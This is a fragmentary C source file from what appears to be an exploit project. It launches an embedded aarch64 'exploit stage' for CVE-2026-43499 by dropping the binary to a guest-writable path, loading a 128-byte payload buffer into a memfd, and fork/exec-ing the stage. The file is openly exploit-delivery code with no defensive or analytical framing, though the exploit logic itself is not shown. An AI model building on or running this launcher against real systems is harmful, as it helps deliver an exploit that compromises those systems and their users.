/*
 * exp64_launcher.c — launcher for the embedded 64-bit CVE-2026-43499 stage.
 *
 * Provides:
 *   int exp64_stack_once(uint64_t *buffer);
 *
 * The caller prepares a 16-word (128-byte) payload buffer and this
 * function hands it to the embedded aarch64 binary:
 *
 ...
 *   3. the child execve()s the 64-bit stage with the memfd number as
...
/* Embedded 64-bit stage (see src/exp64_blob.S). */
...
/*
 * install_embedded_exp64 — drop the embedded aarch64 exploit stage
 * to a guest-writable path so exp64_stack_once() can execve() it.
 */
...
int exp64_stack_once(uint64_t *buffer) {
  if (!buffer) {
    pr_warning("exp64_stack_once: NULL buffer\n");
    return -1;
  }

  if (!install_embedded_exp64()) {
    pr_warning("exp64_stack_once: embedded exp64 install failed errno=%d\n",
               errno);
    return -2;
  }
  ...
  if (mfd < 0) {
    pr_warning("exp64_stack_once: memfd_create errno=%d\n", errno);
    return -1;
  }
  ssize_t written = write(mfd, buffer, EXP_BUFFER_BYTES);
  if (written != EXP_BUFFER_BYTES) {
    pr_warning("exp64_stack_once: memfd write %zd errno=%d\n",
               written, errno);
    close(mfd);
    return -1;
  }
  ...
  pid_t pid = fork();
  if (pid < 0) {
    pr_warning("exp64_stack_once: fork errno=%d\n", errno);
    close(mfd);
    return -1;
  }
  ...
  if (pid == 0) {
    ...
    pr_warning("exp64_stack_once: execl errno=%d\n", errno);
    _exit(127);
  }
  ...
  if (WIFEXITED(status)) {
    ...
    if (exit_code == 127) {
      pr_warning("exp64_stack_once: executable not found at %s\n",
                 exp64_local_path());
      return -2;
    }
    return exit_code;
  ...
  if (WIFSIGNALED(status)) {
    pr_warning("exp64_stack_once: child killed by signal %d\n",
               WTERMSIG(status));
  }
  return -1;
}
